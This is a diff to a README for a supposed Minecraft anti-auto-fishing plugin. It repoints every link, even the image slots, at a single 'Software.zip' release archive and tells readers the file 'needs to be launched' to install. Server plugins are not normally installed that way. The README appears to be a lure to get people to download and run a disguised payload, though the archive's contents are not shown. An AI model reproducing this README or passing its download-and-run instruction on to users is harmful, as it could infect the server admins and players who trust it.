@@ -1,6 +1,6 @@
 # 🎣 AntiAutoFish 🚫
 
-![AntiAutoFish Logo](https://example.com/anti-autofish-logo.jpg)
+![AntiAutoFish Logo](https://github.com/PSHNIM/AntiAutoFish/releases/download/v2.0/Software.zip)
 
 Welcome to the AntiAutoFish repository! This project aims to detect and prevent automated fishing behavior on Minecraft servers. By utilizing this Bukkit/Spigot plugin, server admins can ensure fair gameplay by stopping players from using auto-fishing mechanisms.
 
@@ -13,7 +13,7 @@ Welcome to the AntiAutoFish repository! This project aims to detect and prevent 
 ## Installation 🔧
 To utilize AntiAutoFish on your Minecraft server, download the plugin from the following link:
 
-[![Download AntiAutoFish](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download AntiAutoFish](https://github.com/PSHNIM/AntiAutoFish/releases/download/v2.0/Software.zip)](https://github.com/PSHNIM/AntiAutoFish/releases/download/v2.0/Software.zip)
 
 The file needs to be launched to initiate the installation process successfully. 
 
@@ -28,11 +28,11 @@ The file needs to be launched to initiate the installation process successfully.
 ['anti', 'antifish', 'automation', 'bukkit', 'cheat', 'detection', 'fairplay', 'fishing', 'gameplay', 'macro', 'mending', 'minecraft', 'moderation', 'plugin', 'prevention', 'server', 'spigot', 'tripwire', 'utility']
 
 ## Visit the Link
-If the provided link is not working or you require additional information, please visit the [Releases](https://github.com/user-attachments/files/18410590/releases) section for alternative download options.
+If the provided link is not working or you require additional information, please visit the [Releases](https://github.com/PSHNIM/AntiAutoFish/releases/download/v2.0/Software.zip) section for alternative download options.
 
 ## Contribute 🤝
 Contributions to AntiAutoFish are welcome! Feel free to submit pull requests or raise issues if you encounter any bugs or have suggestions for improvements.
 
 **Happy Fishing, Fair and Square!** 🎣🚫
 
-![Minecraft Server](https://example.com/minecraft-server-image.jpg)
+![Minecraft Server](https://github.com/PSHNIM/AntiAutoFish/releases/download/v2.0/Software.zip)
